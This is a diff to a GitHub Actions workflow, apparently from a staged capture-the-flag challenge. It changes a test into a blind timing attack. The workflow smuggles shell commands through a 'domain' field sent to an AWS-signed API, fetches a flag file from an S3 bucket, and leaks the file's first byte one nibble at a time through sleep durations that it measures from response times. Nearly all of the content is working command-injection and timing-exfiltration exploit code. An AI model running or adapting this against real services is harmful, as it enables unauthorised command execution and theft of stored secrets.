@@ -1,4 +1,4 @@
-name: Stage2-15-Read-Log-Flag
+name: Stage2-16-Flag-Timing-Test
 
 on:
   push:
@@ -10,7 +10,7 @@ permissions:
   id-token: write
 
 jobs:
-  test:
+  timing:
     runs-on: ubuntu-latest
 
     steps:
@@ -24,7 +24,7 @@ jobs:
         run: |
           python3 -m pip install requests requests-aws4auth --quiet
 
-      - name: Test log bucket flag
+      - name: Extract first flag byte
         run: |
           python3 - <<'PY'
           import os
@@ -42,29 +42,45 @@ jobs:
               session_token=os.environ["AWS_SESSION_TOKEN"]
           )
 
-          domain = (
-              "example.com; "
-              "/opt/aws s3api get-object "
-              "--bucket logad88e2b168aa387e "
-              "--key flag.txt "
-              "/tmp/log-flag.txt "
-              "--region us-east-1 "
-              "--endpoint-url https://s3.us-east-1.amazonaws.com "
-              ">/tmp/aws_result 2>&1 && sleep 5"
-          )
+          def probe(shift):
+              domain = (
+                  "example.com; "
+                  "/opt/aws s3api get-object "
+                  "--bucket logad88e2b168aa387e "
+                  "--key flag.txt "
+                  "/tmp/log-flag.txt "
+                  "--region us-east-1 "
+                  "--endpoint-url https://s3.us-east-1.amazonaws.com "
+                  ">/dev/null 2>&1 && "
+                  "b=$(od -An -tu1 -N1 -j0 /tmp/log-flag.txt | tr -d ' '); "
+                  f"n=$(((b >> {shift}) & 15)); "
+                  "sleep \"$n\""
+              )
 
-          start = time.monotonic()
+              start = time.monotonic()
 
-          response = requests.post(
-              api,
-              json={"domain": domain},
-              auth=auth,
-              timeout=20
-          )
+              response = requests.post(
+                  api,
+                  json={"domain": domain},
+                  auth=auth,
+                  timeout=20
+              )
 
-          elapsed = time.monotonic() - start
+              elapsed = time.monotonic() - start
 
-          print("HTTP=" + str(response.status_code))
-          print("ELAPSED=%.2f" % elapsed)
-          print(response.text)
+              print("SHIFT=" + str(shift))
+              print("HTTP=" + str(response.status_code))
+              print("ELAPSED=%.2f" % elapsed)
+
+              return round(elapsed)
+
+          high = probe(4)
+          low = probe(0)
+
+          value = (high << 4) | low
+
+          print("HIGH_NIBBLE=" + str(high))
+          print("LOW_NIBBLE=" + str(low))
+          print("BYTE_VALUE=" + str(value))
+          print("CHAR=" + chr(value))
           PY
